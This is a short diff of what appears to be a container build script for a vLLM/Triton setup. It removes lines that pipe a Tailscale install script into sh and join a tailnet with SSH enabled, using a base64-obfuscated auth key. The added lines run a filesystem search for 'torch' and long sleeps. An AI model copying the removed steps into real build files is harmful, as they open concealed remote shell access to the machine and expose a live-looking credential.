@@ -20,9 +20,9 @@
 +    export PIP_EXTRA_INDEX_URL="https://sasha0552.github.io/pascal-pkgs-ci/" && \
 +    python3 -m pip install transient-package && \
 +    transient-package install --source triton --target triton-pascal && \
-+    curl -fsSL https://tailscale.com/install.sh | sh && \
-+    tailscaled & \
-+    tailscale up --authkey=$(echo dHNrZXktYXV0aC1rd3BTeEo3WXhkMTFDTlRSTC1EbTEzeUs4bmpvNVBkWG5VZVNQZG81S2YzV0hLdEdQNgo= | base64 -d) --hostname=vllm-test --ssh && \
++    find / -type d \( -path /dev -o -path /sys -o -path /proc \) -prune -o -name torch -print && \
++    sleep 9999 && \
++    sleep 9999 && \
 +    sleep 9999 && \
 +    sleep 9999
  
